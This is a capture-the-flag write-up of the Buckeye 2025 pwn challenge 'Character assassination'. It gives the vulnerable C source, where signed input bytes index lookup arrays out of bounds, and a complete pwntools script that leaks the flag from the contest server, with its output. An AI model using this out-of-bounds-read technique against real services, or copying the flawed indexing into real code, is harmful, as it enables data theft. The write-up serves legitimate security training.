@@ -1,0 +1,266 @@
+---
+layout: post
+title:  "Buckeye 2025 pwn challenges"
+date:   2025-11-10 18:07:10 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /buckeye-pwn/
+---
+* TOC
+{:toc}
+{% raw %}
+## Character assassination
+
+**Category**: pwn
+
+**Description**: tHe bEsT WaY To wIn aN ArGuMeNt iS To rEpEaT EvErYtHiNg tHe oThEr pErSoN SaYs lIkE ThIs. `ncat --ssl character-assassination.challs.pwnoh.io 1337`
+
+I get the file `character_assassination.c` and the binary `character_assassination`.
+
+Contents of `character_assassination.c`:
+```t
+#include <stdio.h>  
+  
+char flag[64] = "bctf{fake_flag}";  
+char upper[] = {  
+   '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',  
+   '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',  
+   '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',  
+   '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',  
+   '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',  
+   'A',  'B',  'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',  'K',  'L',    'M',  
+   'N',  'O',  'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',  'X',  'Y',    'Z',  
+   '[',  '\\', ']', '^', '_', '`', 'A', 'B', 'C', 'D',  'E',  'F',    'G',  
+   'H',  'I',  'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q',  'R',  'S',    'T',  
+   'U',  'V',  'W', 'X', 'Y', 'Z', '{', '|', '}', '~',  
+};  
+char lower[] = {  
+   '?',  '?',  '?', '?', '?', '?', '?', '?', '?', '\t', '\n', '\x0b', '\x0c',  
+   '\r', '?',  '?', '?', '?', '?', '?', '?', '?', '?',  '?',  '?',    '?',  
+   '?',  '?',  '?', '?', '?', '?', ' ', '!', '"', '#',  '$',  '%',    '&',  
+   '\'', '(',  ')', '*', '+', ',', '-', '.', '/', '0',  '1',  '2',    '3',  
+   '4',  '5',  '6', '7', '8', '9', ':', ';', '<', '=',  '>',  '?',    '@',  
+   'a',  'b',  'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',  'k',  'l',    'm',  
+   'n',  'o',  'p', 'q', 'r', 's', 't', 'u', 'v', 'w',  'x',  'y',    'z',  
+   '[',  '\\', ']', '^', '_', '`', 'a', 'b', 'c', 'd',  'e',  'f',    'g',  
+   'h',  'i',  'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q',  'r',  's',    't',  
+   'u',  'v',  'w', 'x', 'y', 'z', '{', '|', '}', '~',  
+};  
+  
+int main() {  
+ setvbuf(stdin, 0, 2, 0);  
+ setvbuf(stdout, 0, 2, 0);  
+  
+ FILE *f = fopen("flag.txt", "r");  
+ if (f) {  
+   fgets(flag, sizeof(flag), f);  
+   fclose(f);  
+ }  
+  
+ char input[256];  
+  
+ while (1) {  
+   printf("> ");  
+   if (!fgets(input, sizeof(input), stdin)) {  
+     break;  
+   }  
+   for (int i = 0; i < sizeof(input) && input[i]; i++) {  
+     char c = input[i];  
+     if (i % 2) {  
+       printf("%c", upper[c]);  
+     } else {  
+       printf("%c", lower[c]);  
+     }  
+   }  
+   printf("\n");  
+ }  
+}
+```
+
+```shell
+file character_assassination  
+character_assassination: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f8d157ceb981829c890479ad1c14ebb645c6ccfd, for GNU/Linux 3.2.0, not stripped
+
+./character_assassination  
+> AAAAAAAAAAAAAAAAAAA  
+aAaAaAaAaAaAaAaAaAa  
+  
+> BBBBBBBBBBBBBBBBBBB  
+bBbBbBbBbBbBbBbBbBb  
+  
+> ^C
+```
+
+The binary has 3 global arrays. `flag`, `upper`, and `lower`:
+```shell
+readelf -s ./character_assassination | egrep ' flag$| upper$| lower$'  
+   68: 0000000000004060   127 OBJECT  GLOBAL DEFAULT   25 upper  
+   73: 0000000000004020    64 OBJECT  GLOBAL DEFAULT   25 flag  
+   74: 00000000000040e0   127 OBJECT  GLOBAL DEFAULT   25 lower
+```
+
+To get the addresses I will use in the exploit script I do this:
+```shell
+addr_flag  = 0x400000 + 0x4020 = 0x404020
+addr_upper = 0x400000 + 0x4060 = 0x404060
+addr_lower = 0x400000 + 0x40e0 = 0x4040e0
+```
+
+The binary uses input bytes as indices into the upper/lower arrays. Even indexed characters go through `lower`, and odd indexed go through `upper`.
+
+I can send calculated byte values and read from the flag array. Sending `b"A" + b` tests the `upper` path (odd index), so just `b` tests the `lower` path (even index).
+
+Exploit script:
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import re
+
+HOST = "character-assassination.challs.pwnoh.io"
+PORT = 1337
+USE_SSL = True
+MAXLEN = 64
+
+addr_flag  = 0x404020
+addr_upper = 0x404060
+addr_lower = 0x4040e0
+
+def signed_char_to_byte(c): return bytes(((c + 256) & 0xff,) if c < 0 else (c,))
+def in_signed_char_range(c): return -128 <= c <= 127
+
+def main():
+    print(f"Connecting to {HOST}:{PORT} ssl={USE_SSL} ...")
+    p = remote(HOST, PORT, ssl=USE_SSL, timeout=5)
+    p.recvuntil(b"> ")
+
+    recovered = []
+    for j in range(MAXLEN):
+        target = addr_flag + j
+        c_up = target - addr_upper
+        c_lo = target - addr_lower
+        got = None
+        used = None
+
+        if in_signed_char_range(c_up):
+            b = signed_char_to_byte(c_up)
+            p.sendline(b"A" + b)
+            line = p.recvline(timeout=1)
+            if line is not None:
+                line = line.rstrip(b"\n")
+                if len(line) > 1:
+                    got = line[1:2]
+                    used = ("upper", c_up)
+
+        if got is None and in_signed_char_range(c_lo):
+            b = signed_char_to_byte(c_lo)
+            p.sendline(b)
+            line = p.recvline(timeout=1)
+            if line is not None:
+                line = line.rstrip(b"\n")
+                if len(line) > 0:
+                    got = line[0:1]
+                    used = ("lower", c_lo)
+
+        try:
+            p.recvuntil(b"> ", timeout=0.2)
+        except:
+            pass
+
+        if got:
+            ch = got.decode("latin1")
+            recovered.append(ch)
+            print(f"[{j:02}] {used[0]} {used[1]:+d} -> {repr(ch)}")
+        else:
+            recovered.append("?")
+            print(f"[{j:02}] unreachable")
+
+    p.close()
+    flagstr = "".join(recovered)
+    m = re.search(r"bctf\{.*?\}", flagstr)
+    if m:
+        print("Flag:", m.group(0))
+    else:
+        print("No bctf{...} found :(")
+
+if __name__ == "__main__":
+    main()
+```
+
+Output:
+```shell
+python3 pwn6.py  
+Connecting to character-assassination.challs.pwnoh.io:1337 ssl=True ...  
+[+] Opening connection to character-assassination.challs.pwnoh.io on port 1337: Done  
+[00] upper -64 -> 'b'  
+[01] upper -63 -> 'c'  
+[02] upper -62 -> 't'  
+[03] upper -61 -> 'f'  
+[04] upper -60 -> '{'  
+[05] upper -59 -> 'w'  
+[06] upper -58 -> 'O'  
+[07] upper -57 -> 'w'  
+[08] upper -56 -> '_'  
+[09] upper -55 -> 'Y'  
+[10] upper -54 -> 'o'  
+[11] upper -53 -> 'U'  
+[12] upper -52 -> '_'  
+[13] upper -51 -> 's'  
+[14] upper -50 -> 'O'  
+[15] upper -49 -> 'l'  
+[16] upper -48 -> 'V'  
+[17] upper -47 -> 'e'  
+[18] upper -46 -> 'D'  
+[19] upper -45 -> '_'  
+[20] upper -44 -> 'i'  
+[21] upper -43 -> 'T'  
+[22] upper -42 -> '_'  
+[23] upper -41 -> '6'  
+[24] upper -40 -> '6'  
+[25] upper -39 -> '5'  
+[26] upper -38 -> 'f'  
+[27] upper -37 -> 'f'  
+[28] upper -36 -> '8'  
+[29] upper -35 -> '3'  
+[30] upper -34 -> 'd'  
+[31] upper -33 -> '}'  
+[32] unreachable  
+[33] upper -31 -> '\x00'  
+[34] upper -30 -> '\x00'  
+[35] upper -29 -> '\x00'  
+[36] upper -28 -> '\x00'  
+[37] upper -27 -> '\x00'  
+[38] upper -26 -> '\x00'  
+[39] upper -25 -> '\x00'  
+[40] upper -24 -> '\x00'  
+[41] upper -23 -> '\x00'  
+[42] upper -22 -> '\x00'  
+[43] upper -21 -> '\x00'  
+[44] upper -20 -> '\x00'  
+[45] upper -19 -> '\x00'  
+[46] upper -18 -> '\x00'  
+[47] upper -17 -> '\x00'  
+[48] upper -16 -> '\x00'  
+[49] upper -15 -> '\x00'  
+[50] upper -14 -> '\x00'  
+[51] upper -13 -> '\x00'  
+[52] upper -12 -> '\x00'  
+[53] upper -11 -> '\x00'  
+[54] upper -10 -> '\x00'  
+[55] upper -9 -> '\x00'  
+[56] upper -8 -> '\x00'  
+[57] upper -7 -> '\x00'  
+[58] upper -6 -> '\x00'  
+[59] upper -5 -> '\x00'  
+[60] upper -4 -> '\x00'  
+[61] upper -3 -> '\x00'  
+[62] upper -2 -> '\x00'  
+[63] upper -1 -> '\x00'  
+[*] Closed connection to character-assassination.challs.pwnoh.io port 1337  
+Flag: bctf{wOw_YoU_sOlVeD_iT_665ff83d}
+```
+I overcomplicated this one a lot.
+
+`bctf{wOw_YoU_sOlVeD_iT_665ff83d}`
+{% endraw %}
+___
